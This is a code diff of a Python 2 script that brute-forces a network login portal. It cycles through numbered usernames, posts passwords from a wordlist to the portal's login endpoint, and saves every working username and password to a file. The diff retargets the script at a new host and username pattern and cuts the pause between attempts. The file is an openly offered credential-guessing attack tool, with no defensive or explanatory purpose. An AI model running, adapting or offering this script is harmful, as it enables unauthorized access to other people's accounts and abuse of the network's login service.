@@ -13,8 +13,8 @@ import urllib2
 
 user_list = open("userlist.txt","a")
 pass_list = open("passwordlist.txt","r")
-user_name = "u12me"
-host_url = 'http://172.50.1.1:8090/login.xml'
+user_name = "mec13"
+host_url = 'http://172.16.1.100:8090/httpclient.html'
 
 def connectivity():
 	try:
@@ -26,8 +26,8 @@ def connectivity():
 	return False
 
 flag = True
-usernumber_min = 1
-usernumber_max = 200
+usernumber_min = 01
+usernumber_max = 70
 
 if connectivity() == True:
 	while flag :
@@ -49,17 +49,17 @@ if connectivity() == True:
 			#----------------------------------------------------------------------------
 			#----------------------------------------------------------------------------		
 			if usernumber_min <= 9:
-				print 'Checking User: ' + user_name + '00' + str(usernumber_min)
+				print 'Checking User: ' + user_name + '' + str(usernumber_min)
 			elif usernumber_min >= 10 and usernumber_min <= 99 :
-				print 'Checking User: ' + user_name + '0' + str(usernumber_min)
+				print 'Checking User: ' + user_name + '' + str(usernumber_min)
 			else :
 				print 'Checking User: ' + user_name + str(usernumber_min)
 			#----------------------------------------------------------------------------
 			#----------------------------------------------------------------------------
 			if usernumber_min <= 9:
-				get = urllib.urlopen(host_url,"mode=191&username="+user_name+"00"+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
+				get = urllib.urlopen(host_url,"mode=191&username="+user_name+""+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
 			elif usernumber_min >= 10 and usernumber_min <= 99 :
-				get = urllib.urlopen(host_url,"mode=191&username="+user_name+"0"+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
+				get = urllib.urlopen(host_url,"mode=191&username="+user_name+""+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")			
 			else :
 				get = urllib.urlopen(host_url,"mode=191&username="+user_name+str(usernumber_min)+"&password="+passwd+"&a=1355344698415")
 			#----------------------------------------------------------------------------
@@ -70,12 +70,12 @@ if connectivity() == True:
 			#----------------------------------------------------------------------------
 			#----------------------------------------------------------------------------
 			if return_value != -1:
-				print '--->Username: ',usernumber_min
-				user_list.write('Username: '+str(usernumber_min)+' Password:'+passwd)
+				print '--->hurrah new pasword found user name is   Username: ',usernumber_min
+				user_list.write('Username:'+ user_name +str(usernumber_min)+' Password:'+passwd)
 				user_list.write("\n")
 			usernumber_min = usernumber_min  + 1
 		
-		time.sleep(5)
+		time.sleep(2)
 		usernumber_min = 1
 else:
 	print 'No connectivity to host'
